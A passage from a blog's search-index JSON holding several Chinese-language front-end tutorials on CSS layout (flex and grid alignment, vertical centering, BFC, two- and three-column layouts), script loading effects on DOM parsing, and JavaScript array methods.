&lt;i&gt;&lt;/i&gt;&lt;i&gt;&lt;/i&gt;&lt;i&gt;&lt;/i&gt;&lt;i&gt;&lt;/i&gt;&lt;i&gt;&lt;/i&gt;10&lt;/div&gt; 相关CSS如下，实现的关键就是占位的&lt;i&gt;元素宽度和margin大小设置得和.list列表元素一样即可，其他样式都不需要写。 123456789101112131415161.container &#123;2 display: flex;3 justify-content: space-between;4 flex-wrap: wrap;5 margin-right: -10px;6&#125;7.list &#123;8 width: 100px; height:100px;9 background-color: skyblue;10 margin: 15px 10px 0 0;11&#125;12/* 和列表一样的宽度和margin值 */13.container &gt; i &#123;14 width: 100px;15 margin-right: 10px;16&#125; 由于&lt;i&gt;元素高度为0，因此，并不会影响垂直方向上的布局呈现。 如果列数不固定HTML又不能调整然而有时候，由于客观原因，前端重构人员没有办法去调整html结构，同时布局的列表个数又不固定，这个时候该如何实现我们最后一行左对齐效果呢？ 我们不妨可以试试使用Grid布局。 Grid布局天然有gap间隙，且天然格子对齐排布，因此，实现最后一行左对齐可以认为是天生的效果。 CSS代码如下： 1234567891011121314&lt;style&gt; .container &#123; display: grid; justify-content: space-between; grid-template-columns: repeat(auto-fill,100px); grid-gap: 10px; &#125; .list &#123; width: 100px; height: 100px; background-color: skyblue; margin-top: 5px; &#125; &lt;/style&gt; 这几种实现方法点评首先最后一行需要左对齐的布局更适合使用CSS grid布局实现，但是，repeat()函数兼容性有些要求，IE浏览器并不支持。如果项目需要兼容IE，则此方法需要斟酌。 然后，适用范围最广的方法是使用空的元素进行占位，此方法不仅适用于列表个数不固定的场景，对于列表个数固定的场景也可以使用这个方法。但是有些人代码洁癖，看不惯这种空的占位的html标签，则可以试试一开始的两个方法，一是动态计算margin，模拟两端对齐，另外一个是根据列表的个数，动态控制最后一个列表元素的margin值实现左对齐。","categories":[{"name":"CSS","slug":"CSS","permalink":"https://coloey.github.io/categories/CSS/"}],"tags":[]},{"title":"实现水平垂直居中","slug":"实现水平垂直居中","date":"2022-04-23T09:10:33.000Z","updated":"2022-04-23T13:59:01.571Z","comments":true,"path":"2022/04/23/实现水平垂直居中/","link":"","permalink":"https://coloey.github.io/2022/04/23/%E5%AE%9E%E7%8E%B0%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E5%B1%85%E4%B8%AD/","excerpt":"","text":"我们在布局一个页面时，通常都会用到水平居中和垂直居中，处理水平居中很好处理，不外乎就是设定margin:0 auto;或是text-align:center;,就可以轻松解决掉水平居中的问题，但一直以来最麻烦对齐问题就是「垂直居中」，以下将介绍几种单纯利用CSS垂直居中的方式，只需要理解背后的原理就可以轻松应用。 下面为公共代码： 1234567891011121&lt;div class=&quot;box&quot;&gt;2 &lt;div class=&quot;small&quot;&gt;small&lt;/div&gt;3&lt;/div&gt;1.box &#123;2 width: 300px;3 height: 300px;4 background: #ddd;5&#125;6.small &#123;7 background: red;8&#125;9 absolute + margin实现方法一： 12345678910111.box &#123;2 position: relative;3&#125;4.small &#123;5 position: absolute;6 top: 50%;7 left: 50%;8 margin: -50px 0 0 -50px;9 width: 100px;10 height: 100px;11&#125; 方法二： margin:auto会自动去计算子元素和父元素之间的边距，并设为居中。所以就会实现上下左右都居中。 1.在普通内容流中，margin:auto的效果等同于margin:0 auto,左右会去极端剩余空间平均分配，而上下默认都为0； 2.position:absolute使绝对定位块跳出了内容流，内容流中的其余部分渲染时绝对定位部分不进行渲染。 3.为块区域设置top: 0; left: 0; bottom: 0; right: 0;将给浏览器重新分配一个边界框，此时该块将填充其父元素的所有可用空间，所以margin 垂直方向上有了可分配的空间。 4.再设置margin 垂直方向上下为auto，即可实现垂直居中。（注意高度得设置）。 123456789101112131.box &#123;2 position: relative;3&#125;4.small &#123;5 position: absolute;6 top: 0;7 right: 0;8 bottom: 0;9 left: 0;10 margin: auto;11 width: 100px;12 height: 100px;13&#125; absolute + calc 实现123456789101.box &#123;2 position: relative;3&#125;4.small &#123;5 position: absolute;6 top: calc(50% - 50px);7 left: calc(50% - 50px);8 width: 100px;9 height: 100px;10&#125; absolute + transform 实现1234567891011121.box &#123;2 position: relative;3&#125;4.small &#123;5 position: absolute;6 top: 50%;7 left: 50%;8 transform: translate3d(-50%,-50%,0);9 width: 100px;10 height: 100px;11&#125;12 转行内元素1234567891011.box &#123; line-height:300px; text-align: center;&#125;.small &#123; padding: 6px 10px; display:inline-block; font-size:16px; vertical-aligin: middle; line-height: 16px;&#125; vertical-align:在W3C官方中对 vertical-align做了下面的解释：This property affects the vertical positioning inside a line box of the boxes generated by an inline-level element.事实上，一个Box中由很多行很多元素组成，vertical-align只作用于在同一行内的元素，它的垂直并不是相对于整个Box而言的。如果把 vertical-align:middle 放到一个单元格元素，即table的td元素中，它的垂直居中显示是没任何问题的，因为它表示相对于改行的垂直高度居中显示。而在我设定的div块中并不只存在一行，因此它无法识别默认显示在顶部。 为了解决这个问题，我找到了两种方法。一个是我们可以设置元素style中的 line-heght 值为其父元素的height值，这样 vertical-align:middle 就会使元素内容垂直居中。 另外还有种方法，就是将要设置垂直居中的元素的父元素style属性添加 display:table-cell 将其作为单元格显示，这样使用 vertical-align:middle 也可以实现垂直居中 转行内元素并且使用table-cell12345678910111213.box &#123; display: table-cell; height: 300px; width: 300px; text-align: center; background: green; vertical-align: middle; &#125; .small &#123; padding: 6px 10px; display:inline-block; background-color: aliceblue; &#125; flex方法一： 123451.box &#123;2 display: flex;3 justify-content: center;4 align-items: center;5&#125; 方法二： 12345671.box &#123;2 display: flex;3 justify-content: center;4&#125;5.small &#123;6 align-self: center;7&#125; grid布局123456789101112131415.box &#123; display: grid; height: 300px; width: 300px; justify-items: center; align-items: center; background-color: #000; &#125; .small &#123; width: 100px; height: 100px; background-color: #fff; &#125; 方法二： 12345671.box &#123;2 display: grid;3&#125;4.small &#123;5 justify-self: center;6 align-self: center;7&#125; 方法三： 123456781.box &#123;2 display: grid;3 justify-items: center;4&#125;5.small &#123;6 align-self: center;7&#125;8 方法四： 1234567复制1.box &#123;2 display: grid;3 align-items: center;4&#125;5.small &#123;6 justify-self: center;7&#125;","categories":[{"name":"CSS","slug":"CSS","permalink":"https://coloey.github.io/categories/CSS/"}],"tags":[]},{"title":"BFC","slug":"BFC","date":"2022-04-23T03:15:31.000Z","updated":"2022-05-02T15:49:06.314Z","comments":true,"path":"2022/04/23/BFC/","link":"","permalink":"https://coloey.github.io/2022/04/23/BFC/","excerpt":"","text":"一、常见定位方案在讲 BFC 之前，我们先来了解一下常见的定位方案，定位方案是控制元素的布局，有三种常见方案: 普通流 (normal flow) 在普通流中，元素按照其在 HTML 中的先后位置至上而下布局，在这个过程中，行内元素水平排列，直到当行被占满然后换行，块级元素则会被渲染为完整的一个新行，除非另外指定，否则所有元素默认都是普通流定位，也可以说，普通流中元素的位置由该元素在 HTML 文档中的位置决定。 浮动 (float) 在浮动布局中，元素首先按照普通流的位置出现，然后根据浮动的方向尽可能的向左边或右边偏移，其效果与印刷排版中的文本环绕相似。 绝对定位 (absolute positioning) 在绝对定位布局中，元素会整体脱离普通流，因此绝对定位元素不会对其兄弟元素造成影响，而元素具体的位置由绝对定位的坐标决定。 二、BFC 概念Formatting context(格式化上下文) 是 W3C CSS2.1 规范中的一个概念。它是页面中的一块渲染区域，并且有一套渲染规则，它决定了其子元素将如何定位，以及和其他元素的关系和相互作用。 那么 BFC 是什么呢？ BFC 即 Block Formatting Contexts (块级格式化上下文)，它属于上述定位方案的普通流。 **具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器所没有的一些特性。** 通俗一点来讲，可以把 BFC 理解为一个封闭的大箱子，箱子内部的元素无论如何翻江倒海，都不会影响到外部。 定位方案： 内部的Box会在垂直方向上一个接一个放置。 Box垂直方向的距离由margin决定，属于同一个BFC的两个相邻Box的margin会发生重叠。 每个元素的margin box 的左边，与包含块border box的左边相接触。 BFC的区域不会与float box重叠。 BFC是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。 计算BFC的高度时，浮动元素也会参与计算。 三、触发 BFC只要元素满足下面任一条件即可触发 BFC 特性： html 根元素 浮动元素：float 除 none 以外的值 绝对定位元素：position (absolute、fixed) display 为 inline-block、table-cells、flex overflow 除了 visible 以外的值 (hidden、auto、scroll) 四、BFC 特性及应用1. 同一个 BFC 下外边距会发生折叠 123456789101112&lt;head&gt;div&#123; width: 100px; height: 100px; background: lightblue; margin: 100px;&#125;&lt;/head&gt;&lt;body&gt; &lt;div&gt;&lt;/div&gt; &lt;div&gt;&lt;/div&gt;&lt;/body&gt; 从效果上看，因为两个 div 元素都处于同一个 BFC 容器下 (这里指 body 元素) 所以第一个 div 的下边距和第二个 div 的上边距发生了重叠，所以两个盒子之间距离只有 100px，而不是 200px。 首先这不是 CSS 的 bug，我们可以理解为一种规范，如果想要避免外边距的重叠，可以将其放在不同的 BFC 容器中。 123456789101112131415&lt;div class=&quot;container&quot;&gt; &lt;p&gt;&lt;/p&gt;&lt;/div&gt;&lt;div class=&quot;container&quot;&gt; &lt;p&gt;&lt;/p&gt;&lt;/div&gt;.container &#123; overflow: hidden;&#125;p &#123; width: 100px; height: 100px; background: lightblue; margin: 100px;&#125; 这时候，两个盒子边距就变成了 200px 2. BFC 可以包含浮动的元素（清除浮动） 我们都知道，浮动的元素会脱离普通文档流，来看下下面一个例子 123&lt;div style=&quot;border: 1px solid #000;&quot;&gt; &lt;div style=&quot;width: 100px;height: 100px;background: #eee;float: left;&quot;&gt;&lt;/div&gt;&lt;/div&gt; 由于容器内元素浮动，脱离了文档流，所以容器只剩下 2px 的边距高度。如果使触发容器的 BFC，那么容器将会包裹着浮动元素。 123&lt;div style=&quot;border: 1px solid #000;overflow: hidden&quot;&gt; &lt;div style=&quot;width: 100px;height: 100px;background: #eee;float: left;&quot;&gt;&lt;/div&gt;&lt;/div&gt; 效果如图： 3. BFC 可以阻止元素被浮动元素覆盖 先来看一个文字环绕效果： 123&lt;div style=&quot;height: 100px;width: 100px;float: left;background: lightblue&quot;&gt;我是一个左浮动的元素&lt;/div&gt;&lt;div style=&quot;width: 200px; height: 200px;background: #eee&quot;&gt;我是一个没有设置浮动, 也没有触发 BFC 元素, width: 200px; height:200px; background: #eee;&lt;/div&gt; 这时候其实第二个元素有部分被浮动元素所覆盖，(但是文本信息不会被浮动元素所覆盖) 如果想避免元素被覆盖，可触第二个元素的 BFC 特性，在第二个元素中加入 overflow: hidden，就会变成： 这个方法可以用来实现两列自适应布局，效果不错，这时候左边的宽度固定，右边的内容自适应宽度(去掉上面右边内容的宽度)。 我是一个左浮动的元素 我是一个没有设置浮动, 也没有触发 BFC 元素, width: 200px; height:200px; background: #eee;","categories":[{"name":"CSS","slug":"CSS","permalink":"https://coloey.github.io/categories/CSS/"}],"tags":[]},{"title":"js 和css如何影响DOM数构建","slug":"js-和css如何影响DOM数构建","date":"2022-04-22T16:00:11.000Z","updated":"2022-04-22T16:02:05.926Z","comments":true,"path":"2022/04/23/js-和css如何影响DOM数构建/","link":"","permalink":"https://coloey.github.io/2022/04/23/js-%E5%92%8Ccss%E5%A6%82%E4%BD%95%E5%BD%B1%E5%93%8DDOM%E6%95%B0%E6%9E%84%E5%BB%BA/","excerpt":"","text":"先做个总结，然后再进行具体的分析： CSS不会阻塞DOM的解析，但是会影响JAVAScript的运行，javaSscript会阻止DOM树的解析，最终css（CSSOM）会影响DOM树的渲染，也可以说最终会影响渲染树的生成。 接下来我们先看javascript对DOM树构建和渲染是如何造成影响的，分成三种类型来讲解： JavaScript脚本在html页面中123456789101&lt;html&gt;2 &lt;body&gt;3 &lt;div&gt;1&lt;/div&gt;4 &lt;script&gt;5 let div1 = document.getElementsByTagName(&#x27;div&#x27;)[0]6 div1.innerText = &#x27;time.geekbang&#x27;7 &lt;/script&gt;8 &lt;div&gt;test&lt;/div&gt;9 &lt;/body&gt;10&lt;/html&gt; 两段div中间插入一段JavaScript脚本，这段脚本的解析过程就有点不一样了。 当解析到script脚本标签时，HTML解析器暂停工作，javascript引擎介入，并执行script标签中的这段脚本。 因为这段javascript脚本修改了DOM中第一个div中的内容，所以执行这段脚本之后，div节点内容已经修改为time.geekbang了。脚本执行完成之后，HTML解析器回复解析过程，继续解析后续的内容，直至生成最终的DOM。 html页面中引入javaScript文件123456789101//foo.js2let div1 = document.getElementsByTagName(&#x27;div&#x27;)[0]3div1.innerText = &#x27;time.geekbang&#x27;1&lt;html&gt;2 &lt;body&gt;3 &lt;div&gt;1&lt;/div&gt;4 &lt;script type=&quot;text/javascript&quot; src=&#x27;foo.js&#x27;&gt;&lt;/script&gt;5 &lt;div&gt;test&lt;/div&gt;6 &lt;/body&gt;7&lt;/html&gt; 这段代码的功能还是和前面那段代码是一样的，只是把内嵌JavaScript脚本修改成了通过javaScript文件加载。 其整个执行流程还是一样的，执行到JAVAScript标签时，暂停整个DOM的解析，执行javascript代码，不过这里执行javascript时，需要现在在这段代码。这里需要重点关注下载环境，因为javascript文件的下载过程会阻塞DOM解析，而通常下载又是非常耗时的，会受到网络环境、javascript文件大小等因素的影响。 优化机制： 谷歌浏览器做了很多优化，其中一个主要的优化就是预解析操作。当渲染引擎收到字节流之后，会开启一个预解析线程，用来分析HTML文件中包含的JavaScript、CSS等相关文件，解析到相关文件之后，会开启一个预解析线程，用来分析HTML文件中包含的javascprit、css等相关文件、解析到相关文件之后，预解析线程会提前下载这些文件。 再回到 DOM 解析上，我们知道引入 JavaScript 线程会阻塞 DOM，不过也有一些相关的策略来规避，比如使用 CDN 来加速 JavaScript 文件的加载，压缩 JavaScript 文件的体积。 另外，如果 JavaScript 文件中没有操作 DOM 相关代码，就可以将该 JavaScript 脚本设置为异步加载，通过 async 或 defer 来标记代码，使用方式如下所示： 12&lt;script async type=&quot;text/javascript&quot; src=&#x27;foo.js&#x27;&gt;&lt;/script&gt;&lt;script defer type=&quot;text/javascript&quot; src=&#x27;foo.js&#x27;&gt;&lt;/script&gt; async和defer区别： async：脚本并行加载，加载完成之后立即执行，执行时机不确定，仍有可能阻塞HTML解析，执行时机在load事件派发之前。 defer：脚本并行加载，等待HTML解析完成之后，按照加载顺序执行脚本，执行时机DOMContentLoaded事件派发之前。 html页面中有css样式123456789101112131415161//theme.css2div &#123;color:blue&#125;1&lt;html&gt;2&lt;head&gt;3 &lt;style src=&#x27;theme.css&#x27;&gt;&lt;/style&gt;4&lt;/head&gt;5&lt;body&gt;6 &lt;div&gt;1&lt;/div&gt;7 &lt;script&gt;8 let div1 = document.getElementsByTagName(&#x27;div&#x27;)[0]9 div1.innerText = &#x27;time.geekbang&#x27; // 需要 DOM10 div1.style.color = &#x27;red&#x27; // 需要 CSSOM11 &lt;/script&gt;12 &lt;div&gt;test&lt;/div&gt;13&lt;/body&gt;14&lt;/html&gt; 该示例中，JavaScript 代码出现了 div1.style.color = ‘red’ 的语句，它是用来操纵 CSSOM 的，所以在执行 JavaScript 之前，需要先解析 JavaScript 语句之上所有的CSS 样式。所以如果代码里引用了外部的 CSS 文件，那么在执行 JavaScript 之前，还需要等待外部的 CSS 文件下载完成，并解析生成 CSSOM 对象之后，才能执行 JavaScript 脚本。 而 JavaScript 引擎在解析 JavaScript 之前，是不知道 JavaScript 是否操纵了 CSSOM的，所以渲染引擎在遇到 JavaScript 脚本时，不管该脚本是否操纵了 CSSOM，都会执行CSS 文件下载，解析操作，再执行 JavaScript 脚本。所以说 JavaScript 脚本是依赖样式表的，这又多了一个阻塞过程。 总结：通过上面三点的分析，我们知道了 JavaScript 会阻塞 DOM 生成，而样式文件又会阻塞js的执行。","categories":[{"name":"CSS","slug":"CSS","permalink":"https://coloey.github.io/categories/CSS/"}],"tags":[]},{"title":"数组的常用方法","slug":"数组的常用方法","date":"2022-04-22T15:40:09.000Z","updated":"2022-04-22T15:42:13.610Z","comments":true,"path":"2022/04/22/数组的常用方法/","link":"","permalink":"https://coloey.github.io/2022/04/22/%E6%95%B0%E7%BB%84%E7%9A%84%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/","excerpt":"","text":"一、操作方法数组基本操作可以归纳为 增、删、改、查，需要留意的是哪些方法会对原数组产生影响，哪些方法不会 下面对数组常用的操作方法做一个归纳 增下面前三种是对原数组产生影响的增添方法，第四种则不会对原数组产生影响 push() unshift() splice() concat() push()push()方法接收任意数量的参数，并将它们添加到数组末尾，返回数组的最新长度 1231let colors = []; // 创建一个数组2let count = colors.push(&quot;red&quot;, &quot;green&quot;); // 推入两项3console.log(count) // 2 unshift()unshift()在数组开头添加任意多个值，然后返回新的数组长度 1231let colors = new Array(); // 创建一个数组2let count = colors.unshift(&quot;red&quot;, &quot;green&quot;); // 从数组开头推入两项3alert(count); // 2 splice传入三个参数，分别是开始位置、0（要删除的元素数量）、插入的元素，返回空数组 12341let colors = [&quot;red&quot;, &quot;green&quot;, &quot;blue&quot;];2let removed = colors.splice(1, 0, &quot;yellow&quot;, &quot;orange&quot;)3console.log(colors) // red,yellow,orange,green,blue4console.log(removed) // [] concat()首先会创建一个当前数组的副本，然后再把它的参数添加到副本末尾，最后返回这个新构建的数组，不会影响原始数组 12341let colors = [&quot;red&quot;, &quot;green&quot;, &quot;blue&quot;];2let colors2 = colors.concat(&quot;yellow&quot;, [&quot;black&quot;, &quot;brown&quot;]);3console.log(colors); // [&quot;red&quot;, &quot;green&quot;,&quot;blue&quot;]4console.log(colors2); // [&quot;red&quot;, &quot;green&quot;, &quot;blue&quot;, &quot;yellow&quot;, &quot;black&quot;, &quot;brown&quot;] 删下面三种都会影响原数组，最后一项不影响原数组： pop() shift() splice() slice() pop()pop() 方法用于删除数组的最后一项，同时减少数组的 length 值，返回被删除的项 12341let colors = [&quot;red&quot;, &quot;green&quot;]2let item = colors.pop(); // 取得最后一项3console.log(item) // green4console.log(colors.length) // 1 shift()shift()方法用于删除数组的第一项，同时减少数组的 length 值，返回被删除的项 12341let colors = [&quot;red&quot;, &quot;green&quot;]2let item = colors.shift(); // 取得第一项3console.log(item) // red4console.log(colors.length) // 1 splice()传入两个参数，分别是开始位置，删除元素的数量，返回包含删除元素的数组 12341let colors = [&quot;red&quot;, &quot;green&quot;, &quot;blue&quot;];2let removed = colors.splice(0,1); // 删除第一项3console.log(colors); // green,blue4console.log(removed); // red，只有一个元素的数组 slice()slice() 用于创建一个包含原有数组中一个或多个元素的新数组，不会影响原始数组 1234561let colors = [&quot;red&quot;, &quot;green&quot;, &quot;blue&quot;, &quot;yellow&quot;, &quot;purple&quot;];2let colors2 = colors.slice(1);3let colors3 = colors.slice(1, 4);4console.log(colors) // red,green,blue,yellow,purple5concole.log(colors2); // green,blue,yellow,purple6concole.log(colors3); // green,blue,yellow 改即修改原来数组的内容，常用splice splice()传入三个参数，分别是开始位置，要删除元素的数量，要插入的任意多个元素，返回删除元素的数组，对原数组产生影响 12341let colors = [&quot;red&quot;, &quot;green&quot;, &quot;blue&quot;];2let removed = colors.splice(1, 1, &quot;red&quot;, &quot;purple&quot;); // 插入两个值，删除一个元素3console.log(colors); // red,red,purple,blue4console.log(removed); // green，只有一个元素的数组 查即查找元素，返回元素坐标或者元素值 indexOf() includes() find() indexOf()返回要查找的元素在数组中的位置，如果没找到则返回-1 121let numbers = [1, 2, 3, 4, 5, 4, 3, 2, 1];2numbers.indexOf(4) // 3 includes()返回要查找的元素在数组中的位置，找到返回true，否则false 121let numbers = [1, 2, 3, 4, 5, 4, 3, 2, 1];2numbers.includes(4) // true find()返回第一个匹配的元素 12345678910111const people = [2 &#123;3 name: &quot;Matt&quot;,4 age: 275 &#125;,6 &#123;7 name: &quot;Nicholas&quot;,8 age: 299 &#125;10];11people.find((element, index, array) =&gt; element.age &lt; 28) // // &#123;name: &quot;Matt&quot;, age: 27&#125; 二、排序方法数组有两个方法可以用来对元素重新排序： reverse() sort() reverse()顾名思义，将数组元素方向排列 1231let values = [1, 2, 3, 4, 5];2values.reverse();3alert(values); // 5,4,3,2,1 sort()sort()方法接受一个比较函数，用于判断哪个值应该排在前面 1234567891011121function compare(value1, value2) &#123;2 if (value1 &lt; value2) &#123;3 return -1;4 &#125; else if (value1 &gt; value2) &#123;5 return 1;6 &#125; else &#123;7 return 0;8 &#125;9&#125;10let values = [0, 1, 5, 10, 15];11values.sort(compare);12alert(values); // 0,1,5,10,15 三、转换方法常见的转换方法有： join()join() 方法接收一个参数，即字符串分隔符，返回包含所有项的字符串 1231let colors = [&quot;red&quot;, &quot;green&quot;, &quot;blue&quot;];2alert(colors.join(&quot;,&quot;)); // red,green,blue3alert(colors.join(&quot;||&quot;)); // red||green||blue 四、迭代方法常用来迭代数组的方法（都不改变原数组）有如下： some() every() forEach() filter() map() some()对数组每一项都运行传入的函数，如果有一项函数返回 true ，则这个方法返回 true 1231let numbers = [1, 2, 3, 4, 5, 4, 3, 2, 1];2let someResult = numbers.every((item, index, array) =&gt; item &gt; 2);3console.log(someResult) // true every()对数组每一项都运行传入的函数，如果对每一项函数都返回 true ，则这个方法返回 true 1231let numbers = [1, 2, 3, 4, 5, 4, 3, 2, 1];2let everyResult = numbers.every((item, index, array) =&gt; item &gt; 2);3console.log(everyResult) // false forEach()对数组每一项都运行传入的函数，没有返回值 12341let numbers = [1, 2, 3, 4, 5, 4, 3, 2, 1];2numbers.forEach((item, index, array) =&gt; &#123;3 // 执行某些操作4&#125;); filter()对数组每一项都运行传入的函数，函数返回 true 的项会组成数组之后返回 1231let numbers = [1, 2, 3, 4, 5, 4, 3, 2, 1];2let filterResult = numbers.filter((item, index, array) =&gt; item &gt; 2);3console.log(filterResult); // 3,4,5,4,3 map()对数组每一项都运行传入的函数，返回由每次函数调用的结果构成的数组 123复制1let numbers = [1, 2, 3, 4, 5, 4, 3, 2, 1];2let mapResult = numbers.map((item, index, array) =&gt; item * 2);3console.log(mapResult) // 2,4,6,8,10,8,6,4,2","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"实现两栏，三栏布局等","slug":"实现两栏，三栏布局等","date":"2022-04-20T14:38:41.000Z","updated":"2022-04-23T03:08:38.964Z","comments":true,"path":"2022/04/20/实现两栏，三栏布局等/","link":"","permalink":"https://coloey.github.io/2022/04/20/%E5%AE%9E%E7%8E%B0%E4%B8%A4%E6%A0%8F%EF%BC%8C%E4%B8%89%E6%A0%8F%E5%B8%83%E5%B1%80%E7%AD%89/","excerpt":"","text":"两栏布局实现思路也非常的简单： 使用 float 左浮左边栏 右边模块使用 margin-left 撑出内容块做内容展示 为父级元素添加BFC，防止下方元素飞到上方内容 12345678910111213141516171819202122232425262728&lt;style&gt; body &#123; /* 设置最小宽度，防止挤压使中间内容消失 */ min-width: 600px; &#125; .box &#123; /* 添加BFC */ overflow: hidden; &#125; .left &#123; float: left; width: 200px; height: 400px; background-color: gray; &#125; .right &#123; margin-left:210px; background-color: red; height: 200px; &#125;&lt;/style&gt;&lt;body&gt; &lt;div class=&quot;box&quot;&gt; &lt;div class=&quot;left&quot;&gt;左&lt;/div&gt; &lt;div class=&quot;right&quot;&gt;右&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; flex弹性布局1234567891011121314151&lt;style&gt;2 .box&#123;3 display: flex;4 &#125;5 .left &#123;6 width: 100px;7 &#125;8 .right &#123;9 flex: 1;10 &#125;11&lt;/style&gt;12&lt;div class=&quot;box&quot;&gt;13 &lt;div class=&quot;left&quot;&gt;左边&lt;/div&gt;14 &lt;div class=&quot;right&quot;&gt;右边&lt;/div&gt;15&lt;/div&gt; flex可以说是最好的方案了，代码少，使用简单 注意的是，flex容器的一个默认属性值:align-items: stretch; 这个属性导致了列等高的效果。 为了让两个盒子高度自动，需要设置: align-items: flex-start 三栏布局实现三栏布局中间自适应的布局方式有： 两边使用 float，中间使用 margin 两边使用 absolute，中间使用 margin 两边使用 float 和负 margin display: table 实现 flex实现 grid网格布局 两边使用 float，中间使用 margin需要将中间的内容放在html结构最后，否则右侧会呈在中间内容的下方 实现代码如下： 123456789101112131415161718192021222324252627282930311&lt;style&gt;2 .wrap &#123;3 background: #eee;4 overflow: hidden; &lt;!-- 生成BFC，计算高度时考虑浮动的元素 --&gt;5 padding: 20px;6 height: 200px;7 &#125;8 .left &#123;9 width: 200px;10 height: 200px;11 float: left;12 background: coral;13 &#125;14 .right &#123;15 width: 120px;16 height: 200px;17 float: right;18 background: lightblue;19 &#125;20 .middle &#123;21 margin-left: 220px;22 height: 200px;23 background: lightpink;24 margin-right: 140px;25 &#125;26&lt;/style&gt;27&lt;div class=&quot;wrap&quot;&gt;28 &lt;div class=&quot;left&quot;&gt;左侧&lt;/div&gt;29 &lt;div class=&quot;right&quot;&gt;右侧&lt;/div&gt;30 &lt;div class=&quot;middle&quot;&gt;中间&lt;/div&gt;31&lt;/div&gt; 原理如下： 两边固定宽度，中间宽度自适应。 利用中间元素的margin值控制两边的间距 宽度小于左右部分宽度之和时，右侧部分会被挤下去 这种实现方式存在缺陷： 主体内容是最后加载的。 右边在主体内容之前，如果是响应式设计，不能简单的换行展示 两边使用 absolute，中间使用 margin基于绝对定位的三栏布局：注意绝对定位的元素脱离文档流，相对于最近的已经定位的祖先元素进行定位。无需考虑HTML中结构的顺序 12345678910111213141516171819202122232425262728293031323334353637383940411&lt;style&gt;2 .container &#123;3 position: relative;4 &#125;5 6 .left,7 .right,8 .main &#123;9 height: 200px;10 line-height: 200px;11 text-align: center;12 &#125;1314 .left &#123;15 position: absolute;16 top: 0;17 left: 0;18 width: 100px;19 background: green;20 &#125;2122 .right &#123;23 position: absolute;24 top: 0;25 right: 0;26 width: 100px;27 background: green;28 &#125;2930 .main &#123;31 margin: 0 110px;32 background: black;33 color: white;34 &#125;35&lt;/style&gt;3637&lt;div class=&quot;container&quot;&gt;38 &lt;div class=&quot;left&quot;&gt;左边固定宽度&lt;/div&gt;39 &lt;div class=&quot;right&quot;&gt;右边固定宽度&lt;/div&gt;40 &lt;div class=&quot;main&quot;&gt;中间自适应&lt;/div&gt;41&lt;/div&gt; 两边使用 float 和负 margin12345678910111213141516171819202122232425262728293031323334353637381&lt;style&gt;2 .left,3 .right,4 .main &#123;5 height: 200px;6 line-height: 200px;7 text-align: center;8 &#125;910 .main-wrapper &#123;11 float: left;12 width: 100%;13 &#125;1415 .main &#123;16 margin: 0 110px;17 background: black;18 color: white;19 &#125;2021 .left,22 .right &#123;23 float: left;24 width: 100px;25 margin-left: -100%;26 background: green;27 &#125;2829 .right &#123;30 margin-left: -100px; /* 同自身宽度 */31 &#125;32&lt;/style&gt;3334&lt;div class=&quot;main-wrapper&quot;&gt;35 &lt;div class=&quot;main&quot;&gt;中间自适应&lt;/div&gt;36&lt;/div&gt;37&lt;div class=&quot;left&quot;&gt;左边固定宽度&lt;/div&gt;38&lt;div class=&quot;right&quot;&gt;右边固定宽度&lt;/div&gt; 实现过程： 中间使用了双层标签，外层是浮动的，以便左中右能在同一行展示 左边通过使用负 margin-left:-100%，相当于中间的宽度，所以向上偏移到左侧 右边通过使用负 margin-left:-100px，相当于自身宽度，所以向上偏移到最右侧,相对于最左边偏移自身的宽度，因此到最右侧 缺点： 增加了 .main-wrapper 一层，结构变复杂 使用负 margin，调试也相对麻烦 使用 display: table 实现 标签用于展示行列数据，不适合用于布局。但是可以使用 display: table 来实现布局的效果 123456789101112131415161718192021222324252627282930313233341&lt;style&gt;2 .container &#123;3 height: 200px;4 line-height: 200px;5 text-align: center;6 display: table;7 table-layout: fixed;8 width: 100%;9 &#125;1011 .left,12 .right,13 .main &#123;14 display: table-cell;15 &#125;1617 .left,18 .right &#123;19 width: 100px;20 background: green;21 &#125;2223 .main &#123;24 background: black;25 color: white;26 width: 100%;27 &#125;28&lt;/style&gt;2930&lt;div class=&quot;container&quot;&gt;31 &lt;div class=&quot;left&quot;&gt;左边固定宽度&lt;/div&gt;32 &lt;div class=&quot;main&quot;&gt;中间自适应&lt;/div&gt;33 &lt;div class=&quot;right&quot;&gt;右边固定宽度&lt;/div&gt;34&lt;/div&gt; 实现原理： 层通过 display: table设置为表格，设置 table-layout: fixed`表示列宽自身宽度决定，而不是自动计算。 内层的左中右通过 display: table-cell设置为表格单元。 左右设置固定宽度，中间设置 width: 100% 填充剩下的宽度 使用flex实现利用flex弹性布局，可以简单实现中间自适应 代码如下： 12345678910111213141516171819202122232425262728293031style&gt; .main &#123; display: flex; height: 200px; justify-content: space-between; line-height: 200px; text-align: center; &#125; .left &#123; flex:1; background-color: green; &#125; .right &#123; flex:1; background-color: green; &#125; .middle &#123; flex:5; background-color: black; color:white; &#125;&lt;/style&gt;&lt;body&gt; &lt;div class=&quot;main&quot;&gt; &lt;div class=&quot;left&quot;&gt;左边固定宽度&lt;/div&gt; &lt;div class=&quot;middle&quot;&gt;中间自适应&lt;/div&gt; &lt;div class=&quot;right&quot;&gt;右边固定宽度&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; 实现过程： 仅需将容器设置为display:flex;， 盒内元素两端对其，将中间元素设置为100%宽度，或者设为flex:1，即可填充空白 盒内元素的高度撑开容器的高度 优点： 结构简单直观 可以结合 flex的其他功能实现更多效果，例如使用 order属性调整显示顺序，让主体内容优先加载，但展示在中间 grid网格布局代码如下： 12345678910111213141516171819202122232425262728293031复制1&lt;style&gt;2 .wrap &#123;3 display: grid;4 width: 100%;5 grid-template-columns: 300px auto 300px;6 &#125;78 .left,9 .right,10 .middle &#123;11 height: 100px;12 &#125;1314 .left &#123;15 background: coral;16 &#125;1718 .right &#123;19 width: 300px;20 background: lightblue;21 &#125;2223 .middle &#123;24 background: #555;25 &#125;26&lt;/style&gt;27&lt;div class=&quot;wrap&quot;&gt;28 &lt;div class=&quot;left&quot;&gt;左侧&lt;/div&gt;29 &lt;div 